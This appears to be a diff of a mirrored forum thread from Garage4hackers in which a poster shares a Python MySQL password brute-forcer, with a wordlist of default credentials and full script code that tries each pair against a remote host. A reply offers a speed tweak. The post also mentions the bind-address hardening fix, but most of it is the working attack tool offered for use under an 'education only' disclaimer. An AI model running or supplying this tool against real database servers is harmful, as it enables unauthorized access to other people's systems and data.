@@ -1,28 +1,25 @@
 <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml" dir="ltr" lang="en" id="vbulletin_html">
+<html dir="ltr" id="vbulletin_html" lang="en" xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml"><!-- Mirrored from garage4hackers.com/printthread.php?t=6664&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 18:36:06 GMT --><!-- Added by HTTrack --><head><meta content="text/html;charset=utf-8" http-equiv="content-type"/><!-- /Added by HTTrack -->
 
-<!-- Mirrored from garage4hackers.com/printthread.php?t=6664&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 18:36:06 GMT -->
-<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=ISO-8859-1" /><!-- /Added by HTTrack -->
-<head>
-	<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
-	<base  /><!--[if IE]></base><![endif]-->
-	<meta name="generator" content="vBulletin 4.2.1" />
+	<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+	<base/><!--[if IE]></base><![endif]-->
+	<meta content="vBulletin 4.2.1" name="generator"/>
 
 	
-	<link rel="stylesheet" type="text/css" href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" />
+	<link href="cssddc9.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=bbcode.css,popupmenu.css,printthread.css,vbulletin.css,vbulletin-chrome.css" rel="stylesheet" type="text/css"/>
 	
 
 
 
 	<title> Crack the MySQL (Database) Username and Password Remotely.</title>
-	<link rel="stylesheet" type="text/css" href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" />
+	<link href="css657d.css?styleid=1&amp;langid=1&amp;d=1410988287&amp;td=ltr&amp;sheet=additional.css" rel="stylesheet" type="text/css"/>
 
 </head>
 <body>
 
 <div class="above_body">
-<div id="header" class="floatcontainer">
-<div><a name="top" href="forum.html" class="logo-image"><img src="images/misc/vbulletin4_logo.html" alt="Garage4hackers Forum" /></a></div>
+<div class="floatcontainer" id="header">
+<div><a class="logo-image" href="forum.html" name="top"><img alt="Garage4hackers Forum" src="images/misc/vbulletin4_logo.png"/></a></div>
 </div>
 </div>
 <div class="body_wrapper">
@@ -44,72 +41,112 @@
 		<div class="title">Crack the MySQL (Database) Username and Password Remotely.</div>
 	
 	<div class="content">
-		<blockquote class="restore"><div style="text-align: center;"><font color="#008000"><font size="5">Crack the MySQL (Database) Username and Password Remotely.</font></font></div><br />
-AS Per PCI Compliance, If you want to accept Credit card or debit card online, You must have mysql remote connection disabled. If you don't have you will not be able to sale your product from your website. If you have question, why they have such rule ? than below tool will let you know , what can happen, if you don't follow PCI rule.<br />
-<br />
-Apart from that, if you are really security freaked minded person. Than you should disable your mysql remote connection immediately, atleast for root. you can do that by editing your &quot;mysql configuration file&quot; (my.cnf). <br />
-You need to add below line to prevent mysql remote connection.<br />
-<br />
+		<blockquote class="restore"><div style="text-align: center;"><font color="#008000"><font size="5">Crack the MySQL (Database) Username and Password Remotely.</font></font></div><br/>
+AS Per PCI Compliance, If you want to accept Credit card or debit card online, You must have mysql remote connection disabled. If you don't have you will not be able to sale your product from your website. If you have question, why they have such rule ? than below tool will let you know , what can happen, if you don't follow PCI rule.<br/>
+<br/>
+Apart from that, if you are really security freaked minded person. Than you should disable your mysql remote connection immediately, atleast for root. you can do that by editing your "mysql configuration file" (my.cnf). <br/>
+You need to add below line to prevent mysql remote connection.<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">PHP Code:</div>
-	<hr /><code class="bbcode_code"><code><span style="color: #000000">
-<span style="color: #0000BB">bind</span><span style="color: #007700">-</span><span style="color: #0000BB">address</span><span style="color: #007700">:</span><span style="color: #0000BB">127.0.0.1&nbsp;<br /></span>
+	<hr/><code class="bbcode_code"><code><span style="color: #000000">
+<span style="color: #0000BB">bind</span><span style="color: #007700">-</span><span style="color: #0000BB">address</span><span style="color: #007700">:</span><span style="color: #0000BB">127.0.0.1 
+<br/></span>
 </span>
-</code></code><hr />
-</div>&quot;my.cnf&quot; files are most of the time available at &quot;/etc/mysql/my.cnf&quot; in linux/unix and &quot;C:\mysql&quot; or mysql installation directory.<br />
-<br />
-Enough of reading, let's move on to main point. How to crack mysql username and password remotely.<br />
-<br />
-I have created repository here in github : <a href="../external.html?link=https://github.com/krokite/MySQL-Bruteforce-Tool" target="_blank">https://github.com/krokite/MySQL-Bruteforce-Tool</a><br />
-<br />
-<b><font size="3">System Requirement :</font></b><br />
-<ul><li style="">Operating System: Windows, Linux, Macinotsh [ All ]</li><li style="">Software Required : Python &amp; MySQL</li></ul><br />
-<br />
-<b>Software Requirement Description</b>: Python is required to run the tool and MySQL is required to test the connection.<br />
-<br />
-<font size="3"><b>Steps to run this script :-</b></font><br />
-<ol class="decimal"><li style="">Create &quot;credentiallist.txt&quot; file in pattern Username:Password</li><li style="">Run below command python mysql_bruteforce.py</li><li style="">Grab Coffee and Relax now. When Username and Password is cracked, It will print the result and will exit.</li></ol><br />
-<br />
-Below are &quot;credentiallist.txt&quot; file demo :-<br />
-<br />
+</code></code><hr/>
+</div>"my.cnf" files are most of the time available at "/etc/mysql/my.cnf" in linux/unix and "C:\mysql" or mysql installation directory.<br/>
+<br/>
+Enough of reading, let's move on to main point. How to crack mysql username and password remotely.<br/>
+<br/>
+I have created repository here in github : <a href="../external.html?link=https://github.com/krokite/MySQL-Bruteforce-Tool" target="_blank">https://github.com/krokite/MySQL-Bruteforce-Tool</a><br/>
+<br/>
+<b><font size="3">System Requirement :</font></b><br/>
+<ul><li style="">Operating System: Windows, Linux, Macinotsh [ All ]</li><li style="">Software Required : Python &amp; MySQL</li></ul><br/>
+<br/>
+<b>Software Requirement Description</b>: Python is required to run the tool and MySQL is required to test the connection.<br/>
+<br/>
+<font size="3"><b>Steps to run this script :-</b></font><br/>
+<ol class="decimal"><li style="">Create "credentiallist.txt" file in pattern Username:Password</li><li style="">Run below command python mysql_bruteforce.py</li><li style="">Grab Coffee and Relax now. When Username and Password is cracked, It will print the result and will exit.</li></ol><br/>
+<br/>
+Below are "credentiallist.txt" file demo :-<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Code:</div>
-	<hr /><code class="bbcode_code">username:password<br />
-root:<br />
-root:root<br />
-root:toor<br />
-admin:admin<br />
-root:admin<br />
-root:1<br />
-root:12<br />
-root:123<br />
-root:1234<br />
-root:12345<br />
-root:123456<br />
-root:1234567<br />
-root:12345678<br />
-root:123456789<br />
-root:1234567890<br />
-root:a<br />
-root:ab<br />
-root:abc<br />
-root:abcd<br />
-root:abcde<br />
-root:abcdef<br />
-root:abcdefghijklmnopqrstuvwxyz<br />
-root:hacker<br />
-root:password</code><hr />
-</div>And below is your mysql_bruteforce.py file.<br />
-<br />
+	<hr/><code class="bbcode_code">username:password<br/>
+root:<br/>
+root:root<br/>
+root:toor<br/>
+admin:admin<br/>
+root:admin<br/>
+root:1<br/>
+root:12<br/>
+root:123<br/>
+root:1234<br/>
+root:12345<br/>
+root:123456<br/>
+root:1234567<br/>
+root:12345678<br/>
+root:123456789<br/>
+root:1234567890<br/>
+root:a<br/>
+root:ab<br/>
+root:abc<br/>
+root:abcd<br/>
+root:abcde<br/>
+root:abcdef<br/>
+root:abcdefghijklmnopqrstuvwxyz<br/>
+root:hacker<br/>
+root:password</code><hr/>
+</div>And below is your mysql_bruteforce.py file.<br/>
+<br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">PHP Code:</div>
-	<hr /><code class="bbcode_code"><code><span style="color: #000000">
-<span style="color: #0000BB"></span><span style="color: #FF8000">#!/usr/bin/python<br />#&nbsp;Author&nbsp;:&nbsp;KroKite<br />#&nbsp;Description:&nbsp;Basic&nbsp;Password&nbsp;Bruteforcing&nbsp;Tool.<br />#&nbsp;URL:&nbsp;http://facebook.com/r0ckysharma<br /><br /></span><span style="color: #0000BB">import&nbsp;sys<br />import&nbsp;subprocess<br />import&nbsp;re<br /><br /></span><span style="color: #007700">print&nbsp;</span><span style="color: #DD0000">'''<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$$&nbsp;\&nbsp;$$\&nbsp;&nbsp;&nbsp;$$$$$$$\&nbsp;&nbsp;$$$$$$\&nbsp;&nbsp;&nbsp;$$\&nbsp;&nbsp;&nbsp;$$\&nbsp;$$$$$$\&nbsp;$$$$$$$$\&nbsp;$$$$$$$$$|<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$$&nbsp;|&nbsp;$$&nbsp;|&nbsp;&nbsp;$$&nbsp;__$$&nbsp;\&nbsp;$$&nbsp;__$$\&nbsp;&nbsp;$$&nbsp;|&nbsp;$$&nbsp;|&nbsp;\_$$&nbsp;_|&nbsp;\__$$&nbsp;__|&nbsp;$$&nbsp;______|<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$$&nbsp;|$$&nbsp;/&nbsp;&nbsp;&nbsp;$$&nbsp;|&nbsp;$$&nbsp;|&nbsp;$$&nbsp;/&nbsp;$$&nbsp;|&nbsp;$$&nbsp;|$$&nbsp;/&nbsp;&nbsp;&nbsp;&nbsp;$$&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$$&nbsp;|&nbsp;&nbsp;&nbsp;$$&nbsp;|<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$$$$$&nbsp;/&nbsp;&nbsp;&nbsp;&nbsp;$$$$$$$&nbsp;|&nbsp;$$&nbsp;|&nbsp;$$&nbsp;|&nbsp;$$$$$&nbsp;/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$$&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$$&nbsp;|&nbsp;&nbsp;&nbsp;$$$$$$|<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$$$&nbsp;$$&nbsp;\&nbsp;&nbsp;&nbsp;$$&nbsp;__$$&nbsp;|&nbsp;$$&nbsp;|&nbsp;$$&nbsp;|&nbsp;$$&nbsp;$$|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$$&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$$&nbsp;|&nbsp;&nbsp;&nbsp;$$&nbsp;___|<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$$&nbsp;|\$$\&nbsp;&nbsp;&nbsp;$$&nbsp;|&nbsp;$$&nbsp;|&nbsp;$$&nbsp;|&nbsp;$$&nbsp;|&nbsp;$$&nbsp;|\$$\&nbsp;&nbsp;&nbsp;&nbsp;$$&nbsp;|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$$&nbsp;|&nbsp;&nbsp;&nbsp;$$&nbsp;|<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;$$&nbsp;|&nbsp;\$$\&nbsp;&nbsp;$$&nbsp;|&nbsp;$$&nbsp;|&nbsp;$$$$$$&nbsp;|&nbsp;&nbsp;$$&nbsp;|&nbsp;\$$\&nbsp;$$$$$$\&nbsp;&nbsp;&nbsp;&nbsp;$$&nbsp;|&nbsp;&nbsp;&nbsp;$$$$$$$$$|<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;\__|&nbsp;&nbsp;\__|&nbsp;\__|&nbsp;\__|&nbsp;\______/&nbsp;&nbsp;\__|&nbsp;\__|&nbsp;\______|&nbsp;&nbsp;&nbsp;\__|&nbsp;&nbsp;&nbsp;\________|<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'''<br /></span><span style="color: #007700">print&nbsp;</span><span style="color: #DD0000">"&#91;+&#93;&nbsp;Please&nbsp;Report&nbsp;any&nbsp;Bug&nbsp;to&nbsp;krokite@worldofhacker.com"<br /></span><span style="color: #007700">print&nbsp;</span><span style="color: #DD0000">"&#91;+&#93;&nbsp;Greets&nbsp;to:&nbsp;c1ph3r(Krit&nbsp;Kadnok),&nbsp;Nocdem,&nbsp;MayaSeven,&nbsp;Xcode,&nbsp;webDEVIl,&nbsp;fb1h2s,&nbsp;Aseem&nbsp;Jakhar,&nbsp;Prashant&nbsp;Mahajan,&nbsp;and&nbsp;Other&nbsp;NullCon&nbsp;members,&nbsp;Sukesh&nbsp;Reddy,&nbsp;Sarmanjit&nbsp;Singh,&nbsp;Rakesh&nbsp;Kumar"<br /></span><span style="color: #007700">print&nbsp;</span><span style="color: #DD0000">"&#91;+&#93;&nbsp;For&nbsp;Security&nbsp;Releated&nbsp;Discussions,&nbsp;Do&nbsp;Visit&nbsp;us&nbsp;at&nbsp;http://www.garage4hackers.com&nbsp;or&nbsp;http://forum.worldofhacker.com"<br /></span><span style="color: #007700">print&nbsp;</span><span style="color: #DD0000">"&#91;+&#93;&nbsp;This&nbsp;Application&nbsp;helps&nbsp;you&nbsp;to&nbsp;crack&nbsp;mysql&nbsp;password&nbsp;with&nbsp;given&nbsp;list"<br /></span><span style="color: #007700">print&nbsp;</span><span style="color: #DD0000">"&#91;+&#93;&nbsp;Usage:&nbsp;python&nbsp;mysql_bruteforce.py&nbsp;ip_or_hostname_here"<br /></span><span style="color: #007700">print&nbsp;</span><span style="color: #DD0000">"\n"<br /><br /></span><span style="color: #0000BB">fo&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">open</span><span style="color: #007700">(</span><span style="color: #DD0000">"credentiallist.txt"</span><span style="color: #007700">,&nbsp;</span><span style="color: #DD0000">'r'</span><span style="color: #007700">);<br />for&nbsp;</span><span style="color: #0000BB">lines&nbsp;in&nbsp;fo</span><span style="color: #007700">:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">password&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">lines</span><span style="color: #007700">.</span><span style="color: #0000BB">split</span><span style="color: #007700">(</span><span style="color: #DD0000">'\n'</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">creds&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">password</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">0</span><span style="color: #007700">&#93;.</span><span style="color: #0000BB">split</span><span style="color: #007700">(</span><span style="color: #DD0000">':'</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">len</span><span style="color: #007700">(</span><span style="color: #0000BB">sys</span><span style="color: #007700">.</span><span style="color: #0000BB">argv</span><span style="color: #007700">)&nbsp;==&nbsp;</span><span style="color: #0000BB">2</span><span style="color: #007700">):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">command&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #DD0000">"mysql&nbsp;-h&nbsp;{0}&nbsp;-u&nbsp;{1}&nbsp;-p{2}&nbsp;-e&nbsp;STATUS"</span><span style="color: #007700">.</span><span style="color: #0000BB">format</span><span style="color: #007700">(</span><span style="color: #0000BB">sys</span><span style="color: #007700">.</span><span style="color: #0000BB">argv</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">1</span><span style="color: #007700">&#93;,&nbsp;</span><span style="color: #0000BB">creds</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">0</span><span style="color: #007700">&#93;,&nbsp;</span><span style="color: #0000BB">creds</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">1</span><span style="color: #007700">&#93;)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #0000BB">brute&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">subprocess</span><span style="color: #007700">.</span><span style="color: #0000BB">Popen</span><span style="color: #007700">(</span><span style="color: #0000BB">command</span><span style="color: #007700">.</span><span style="color: #0000BB">split</span><span style="color: #007700">(),&nbsp;</span><span style="color: #0000BB">stdout</span><span style="color: #007700">=</span><span style="color: #0000BB">subprocess</span><span style="color: #007700">.</span><span style="color: #0000BB">PIPE</span><span style="color: #007700">)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(</span><span style="color: #0000BB">re</span><span style="color: #007700">.</span><span style="color: #0000BB">search</span><span style="color: #007700">(</span><span style="color: #DD0000">"Uptime"</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">brute</span><span style="color: #007700">.</span><span style="color: #0000BB">communicate</span><span style="color: #007700">()&#91;</span><span style="color: #0000BB">0</span><span style="color: #007700">&#93;)):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;</span><span style="color: #DD0000">"Password&nbsp;Cracked&nbsp;and&nbsp;your&nbsp;Username:Password&nbsp;is&nbsp;"</span><span style="color: #007700">,&nbsp;</span><span style="color: #0000BB">creds</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">0</span><span style="color: #007700">&#93;,</span><span style="color: #DD0000">":"</span><span style="color: #007700">,</span><span style="color: #0000BB">creds</span><span style="color: #007700">&#91;</span><span style="color: #0000BB">1</span><span style="color: #007700">&#93;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exit()<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;</span><span style="color: #DD0000">"&#91;+&#93;&nbsp;Usage:&nbsp;\n\t&#91;+&#93;&nbsp;root@system#&nbsp;chmod&nbsp;u+x&nbsp;mysql_bruteforce.py\n\t&#91;+&#93;&nbsp;root@system#&nbsp;./mysql_bruteforce.py&nbsp;ip_or_hostname_here"<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span style="color: #007700">exit()&nbsp;<br /></span><span style="color: #0000BB"></span>
+	<hr/><code class="bbcode_code"><code><span style="color: #000000">
+<span style="color: #0000BB"></span><span style="color: #FF8000">#!/usr/bin/python
+<br/># Author : KroKite
+<br/># Description: Basic Password Bruteforcing Tool.
+<br/># URL: http://facebook.com/r0ckysharma
+<br/>
+<br/></span><span style="color: #0000BB">import sys
+<br/>import subprocess
+<br/>import re
+<br/>
+<br/></span><span style="color: #007700">print </span><span style="color: #DD0000">'''
+<br/>        $$ \ $$\   $$$$$$$\  $$$$$$\   $$\   $$\ $$$$$$\ $$$$$$$$\ $$$$$$$$$|
+<br/>        $$ | $$ |  $$ __$$ \ $$ __$$\  $$ | $$ | \_$$ _| \__$$ __| $$ ______|
+<br/>        $$ |$$ /   $$ | $$ | $$ / $$ | $$ |$$ /    $$ |     $$ |   $$ |
+<br/>        $$$$$ /    $$$$$$$ | $$ | $$ | $$$$$ /     $$ |     $$ |   $$$$$$|
+<br/>        $$$ $$ \   $$ __$$ | $$ | $$ | $$ $$|      $$ |     $$ |   $$ ___|
+<br/>        $$ |\$$\   $$ | $$ | $$ | $$ | $$ |\$$\    $$ |     $$ |   $$ |
+<br/>        $$ | \$$\  $$ | $$ | $$$$$$ |  $$ | \$$\ $$$$$$\    $$ |   $$$$$$$$$|
+<br/>        \__|  \__| \__| \__| \______/  \__| \__| \______|   \__|   \________|
+<br/>        '''
+<br/></span><span style="color: #007700">print </span><span style="color: #DD0000">"[+] Please Report any Bug to krokite@worldofhacker.com"
+<br/></span><span style="color: #007700">print </span><span style="color: #DD0000">"[+] Greets to: c1ph3r(Krit Kadnok), Nocdem, MayaSeven, Xcode, webDEVIl, fb1h2s, Aseem Jakhar, Prashant Mahajan, and Other NullCon members, Sukesh Reddy, Sarmanjit Singh, Rakesh Kumar"
+<br/></span><span style="color: #007700">print </span><span style="color: #DD0000">"[+] For Security Releated Discussions, Do Visit us at http://www.garage4hackers.com or http://forum.worldofhacker.com"
+<br/></span><span style="color: #007700">print </span><span style="color: #DD0000">"[+] This Application helps you to crack mysql password with given list"
+<br/></span><span style="color: #007700">print </span><span style="color: #DD0000">"[+] Usage: python mysql_bruteforce.py ip_or_hostname_here"
+<br/></span><span style="color: #007700">print </span><span style="color: #DD0000">"\n"
+<br/>
+<br/></span><span style="color: #0000BB">fo </span><span style="color: #007700">= </span><span style="color: #0000BB">open</span><span style="color: #007700">(</span><span style="color: #DD0000">"credentiallist.txt"</span><span style="color: #007700">, </span><span style="color: #DD0000">'r'</span><span style="color: #007700">);
+<br/>for </span><span style="color: #0000BB">lines in fo</span><span style="color: #007700">:
+<br/>        </span><span style="color: #0000BB">password </span><span style="color: #007700">= </span><span style="color: #0000BB">lines</span><span style="color: #007700">.</span><span style="color: #0000BB">split</span><span style="color: #007700">(</span><span style="color: #DD0000">'\n'</span><span style="color: #007700">)
+<br/>        </span><span style="color: #0000BB">creds </span><span style="color: #007700">= </span><span style="color: #0000BB">password</span><span style="color: #007700">[</span><span style="color: #0000BB">0</span><span style="color: #007700">].</span><span style="color: #0000BB">split</span><span style="color: #007700">(</span><span style="color: #DD0000">':'</span><span style="color: #007700">)
+<br/>        if(</span><span style="color: #0000BB">len</span><span style="color: #007700">(</span><span style="color: #0000BB">sys</span><span style="color: #007700">.</span><span style="color: #0000BB">argv</span><span style="color: #007700">) == </span><span style="color: #0000BB">2</span><span style="color: #007700">):
+<br/>                </span><span style="color: #0000BB">command </span><span style="color: #007700">= </span><span style="color: #DD0000">"mysql -h {0} -u {1} -p{2} -e STATUS"</span><span style="color: #007700">.</span><span style="color: #0000BB">format</span><span style="color: #007700">(</span><span style="color: #0000BB">sys</span><span style="color: #007700">.</span><span style="color: #0000BB">argv</span><span style="color: #007700">[</span><span style="color: #0000BB">1</span><span style="color: #007700">], </span><span style="color: #0000BB">creds</span><span style="color: #007700">[</span><span style="color: #0000BB">0</span><span style="color: #007700">], </span><span style="color: #0000BB">creds</span><span style="color: #007700">[</span><span style="color: #0000BB">1</span><span style="color: #007700">])
+<br/>                </span><span style="color: #0000BB">brute </span><span style="color: #007700">= </span><span style="color: #0000BB">subprocess</span><span style="color: #007700">.</span><span style="color: #0000BB">Popen</span><span style="color: #007700">(</span><span style="color: #0000BB">command</span><span style="color: #007700">.</span><span style="color: #0000BB">split</span><span style="color: #007700">(), </span><span style="color: #0000BB">stdout</span><span style="color: #007700">=</span><span style="color: #0000BB">subprocess</span><span style="color: #007700">.</span><span style="color: #0000BB">PIPE</span><span style="color: #007700">)
+<br/>                if(</span><span style="color: #0000BB">re</span><span style="color: #007700">.</span><span style="color: #0000BB">search</span><span style="color: #007700">(</span><span style="color: #DD0000">"Uptime"</span><span style="color: #007700">, </span><span style="color: #0000BB">brute</span><span style="color: #007700">.</span><span style="color: #0000BB">communicate</span><span style="color: #007700">()[</span><span style="color: #0000BB">0</span><span style="color: #007700">])):
+<br/>                        print </span><span style="color: #DD0000">"Password Cracked and your Username:Password is "</span><span style="color: #007700">, </span><span style="color: #0000BB">creds</span><span style="color: #007700">[</span><span style="color: #0000BB">0</span><span style="color: #007700">],</span><span style="color: #DD0000">":"</span><span style="color: #007700">,</span><span style="color: #0000BB">creds</span><span style="color: #007700">[</span><span style="color: #0000BB">1</span><span style="color: #007700">]
+<br/>                        exit()
+<br/>        else:
+<br/>                print </span><span style="color: #DD0000">"[+] Usage: \n\t[+] root@system# chmod u+x mysql_bruteforce.py\n\t[+] root@system# ./mysql_bruteforce.py ip_or_hostname_here"
+<br/>                </span><span style="color: #007700">exit() 
+<br/></span><span style="color: #0000BB"></span>
 </span>
-</code></code><hr />
-</div><br />
-Good Luck!<br />
-<br />
+</code></code><hr/>
+</div><br/>
+Good Luck!<br/>
+<br/>
 <font color="#FF0000">Note</font>: Kindly note, this tool is for education purpose only. Kindly do not misue, if you misue this tool, I will not be responsible for anything.</blockquote>
 	</div>
 </li><li class="postbit blockbody" id="post_2">
@@ -120,20 +157,20 @@ Good Luck!<br />
 	
 	
 	<div class="content">
-		<blockquote class="restore">Hey, good to begin with!<br />
-<br />
-A logical suggestion here. <br />
+		<blockquote class="restore">Hey, good to begin with!<br/>
+<br/>
+A logical suggestion here. <br/>
 <div class="bbcode_container">
 	<div class="bbcode_description">Quote:</div>
 	<div class="bbcode_quote printable">
-		<hr />
+		<hr/>
 		
 			<font color="#007700"><span style="font-family: monospace">if(</span></font><font color="#0000BB"><span style="font-family: monospace">len</span></font><font color="#007700"><span style="font-family: monospace">(</span></font><font color="#0000BB"><span style="font-family: monospace">sys</span></font><font color="#007700"><span style="font-family: monospace">.</span></font><font color="#0000BB"><span style="font-family: monospace">argv</span></font><font color="#007700"><span style="font-family: monospace">) == </span></font><font color="#0000BB"><span style="font-family: monospace">2</span></font><font color="#007700"><span style="font-family: monospace">):</span></font>
 			
-		<hr />
+		<hr/>
 	</div>
-</div> should be taken out of loop and shall be the first thing to check. In your code, unnecessarily, this condition is getting checked everytime a new cred:pass combo is selected. This would hamper the speed as well.<br />
-<br />
+</div> should be taken out of loop and shall be the first thing to check. In your code, unnecessarily, this condition is getting checked everytime a new cred:pass combo is selected. This would hamper the speed as well.<br/>
+<br/>
 Cheers!</blockquote>
 	</div>
 </li>
@@ -142,14 +179,14 @@ Cheers!</blockquote>
 
 </div>
 <div class="below_body">
-<div id="footer_time" class="footer_time">All times are GMT +5.5. The time now is <span class="time">05:52 PM</span>.</div>
+<div class="footer_time" id="footer_time">All times are GMT +5.5. The time now is <span class="time">05:52 PM</span>.</div>
 
-<div id="footer_copyright" class="footer_copyright">
+<div class="footer_copyright" id="footer_copyright">
 	<!-- Do not remove this copyright notice -->
-	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin&reg;</a> Version 4.2.1 <br />Copyright &copy; 2020 vBulletin Solutions, Inc. All rights reserved. 
+	Powered by <a href="../external.html?link=https://www.vbulletin.com/" id="vbulletinlink">vBulletin®</a> Version 4.2.1 <br/>Copyright © 2020 vBulletin Solutions, Inc. All rights reserved. 
 	<!-- Do not remove this copyright notice -->	
 </div>
-<div id="footer_morecopyright" class="footer_morecopyright">
+<div class="footer_morecopyright" id="footer_morecopyright">
 	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
 	
 	<!-- Do not remove cronimage or your scheduled tasks will cease to function -->
@@ -167,7 +204,7 @@ try{
 var pageTracker = _gat._getTracker('UA-17311051-3');
 pageTracker._trackPageview();
 } catch(err) {}</script>
-</body>
 
-<!-- Mirrored from garage4hackers.com/printthread.php?t=6664&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 18:36:06 GMT -->
-</html>
+
+
+</body><!-- Mirrored from garage4hackers.com/printthread.php?t=6664&pp=10&page=1 by HTTraQt Website Copier/1.x [Karbofos 2012-2017] Sun, 22 Mar 2020 18:36:06 GMT --></html>
